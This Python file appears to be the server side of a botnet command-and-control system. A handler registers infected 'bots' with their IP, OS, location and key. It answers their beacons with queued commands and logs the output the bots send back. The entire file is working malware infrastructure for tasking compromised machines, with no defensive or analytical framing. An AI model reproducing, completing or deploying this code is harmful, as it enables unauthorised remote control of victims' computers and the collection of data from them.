import struct
from database_management import *
import random
import socket

global INITIAL,BEACON_RESP,DATA,BEACON
INITIAL = '<10sH30s20s'
BEACON_RESP = '<H'
DATA = '<10sHH'
BEACON = '<10sHH'

def get_key(pkt):
    return struct.unpack('<10s',pkt[:10])[0].decode()

def make_pkt(typ,**kwargs):
    if typ == 3:
        pkt = struct.pack(BEACON_RESP+'%ds'%(len(kwargs['cmd'])),kwargs['data'],kwargs['cmd'])
    return pkt

def get_type(pkt):
    data = struct.unpack('<10sH',pkt[:12])
    return data[1]

def unpack_data(pkt,ip):
    cmd_size = struct.unpack('<H',pkt[12:14])[0]
    pkt_size = struct.unpack('<H',pkt[14:16])[0]
    # cmd = struct.unpack('<20s',pkt[14:34])[0].decode().strip('*')
    cmd = struct.unpack('<%ds'%(cmd_size),pkt[16:(16+cmd_size)])[0].decode()
    data = struct.unpack('%ds'%(pkt_size),pkt[(16+cmd_size):])[0].decode()
    delete_cmd(cmd,ip)
    return data,cmd,ip
    # TODO unpack data in packet

def unpack(code,pkt):
    return struct.unpack(code,pkt)

class Handler():
    def __init__(self,client,addr):
        self.bot = client
        self.ip = addr
        pkt = self.bot.recv(6000)
        typ = get_type(pkt)
        key = get_key(pkt)
        if typ == 1:
            data = unpack(INITIAL,pkt)
            self.key =  key #data[0].decode()
            os = data[2].decode().strip('*')
            location = data[3].decode().strip('*')
            add_bot(addr,location,os,self.key)
        elif typ == 2:
            data = unpack(BEACON,pkt)
            x = get_info(addr) #Possible entry dosent exist if the server was restarted
            if key == x['key']:
                self.send_beacon_resp()

        elif typ == 4:
            x = get_info(addr)
            if key == x['key']:
                data,cmd,ip = unpack_data(pkt,self.ip)
                # print('[*] Data : ' + data)
                make_output_log(cmd,ip,data)

    def check_command(self):
        s = check_cmd(self.ip)
        if type(s) == int:
            self.cmd = ''
        else:
            self.cmd = s+'*'*(20-len(s))

    def send_beacon_resp(self):
        self.check_command()
        if self.cmd != '':
            pkt = make_pkt(3,data=1,cmd=self.cmd.encode())
        else:
            pkt = make_pkt(3,data=0,cmd=''.encode())
        self.bot.send(pkt)